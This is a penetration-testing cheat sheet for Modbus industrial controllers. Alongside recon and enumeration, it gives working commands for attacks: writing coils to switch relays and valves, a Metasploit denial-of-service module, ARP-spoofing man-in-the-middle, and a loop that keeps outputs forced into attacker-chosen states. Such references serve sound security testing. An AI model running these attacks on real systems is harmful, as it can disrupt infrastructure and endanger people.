# Modbus

**`Default Port: 502`**

**Modbus** is a communication protocol used extensively in industrial environments to facilitate communication between electronic devices. It allows control systems, such as PLCs (Programmable Logic Controllers), to communicate data over serial lines or TCP/IP networks.

### Connect <a href="#connect" id="connect"></a>

To interact with a Modbus device, you must first establish a connection with Python.

```python
from pymodbus.client.sync import ModbusTcpClient

client = ModbusTcpClient('192.168.1.100', port=502)
connection = client.connect()
if connection:
    print("Connected to Modbus device")
else:
    print("Failed to connect to Modbus device")
```

### Recon <a href="#recon" id="recon"></a>

#### Network Scanning <a href="#network-scanning" id="network-scanning"></a>

You can use `Nmap` to identify Modbus-enabled devices within the network.

```
nmap -p 502 --open -sV <target-ip>
```

#### Packet Capture <a href="#packet-capture" id="packet-capture"></a>

Capture Modbus traffic for analysis.

```
# Using tcpdump to capture Modbus TCP traffic
sudo tcpdump -i eth0 dst port 502 -w modbus_traffic.pcap
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Modbus Service Discovery <a href="#modbus-service-discovery" id="modbus-service-discovery"></a>

Discover available functions and gather information from Modbus servers.

```
# Nmap Modbus discovery script
nmap --script modbus-discover -p 502 <target-ip>
```

#### Read Discrete Inputs and Coils <a href="#read-discrete-inputs-and-coils" id="read-discrete-inputs-and-coils"></a>

Enumerates the state of inputs and coils to identify active digital inputs (sensors, switches) and outputs (relays, valves) in the system.

This is typically used as an initial reconnaissance step in security testing to understand the operational state of the PLC.

```
# Using pymodbus to read discrete inputs
response = client.read_discrete_inputs(0, 8, unit=1)
print(response.bits)

# Reading coils
response = client.read_coils(0, 8, unit=1)
print(response.bits)
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Modbus Write Attack <a href="#modbus-write-attack" id="modbus-write-attack"></a>

Inject commands to manipulate values of coils or registers. Can alter the behavior of connected devices like relays and valves by setting values to ON/OFF states.

```
# Write to a single coil
client.write_coil(1, True, unit=1)

# Write to multiple coils
client.write_coils(0, [True] * 8, unit=1)
```

#### Denial of Service <a href="#denial-of-service" id="denial-of-service"></a>

```
# Use a tool like Metasploit:
msfconsole

# Within Metasploit
use auxiliary/dos/scada/modbusclient
set RHOSTS <target-ip>
set THREADS 10
exploit
```

#### Man in the Middle Attack <a href="#man-in-the-middle-attack" id="man-in-the-middle-attack"></a>

Interfere with communication between Modbus devices. Intercepts and monitors Modbus traffic by performing ARP spoofing between devices, allowing an attacker to capture, analyze or manipulate communications between a PLC and its control system.

```
# Ettercap for ARP spoofing
ettercap -T -Q -i eth0 -M arp:remote /<plc-ip>/ /<master-ip>/
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Persistent Control <a href="#persistent-control" id="persistent-control"></a>

Establish persistent control over Modbus devices via rogue commands by continuously sending control signals. This creates a loop that repeatedly forces specific outputs to remain in attacker-defined states, overriding normal system operations.

```
# Regularly send control commands to maintain influence
while True:
    client.write_coil(1, True, unit=1)
    sleep(5)
```
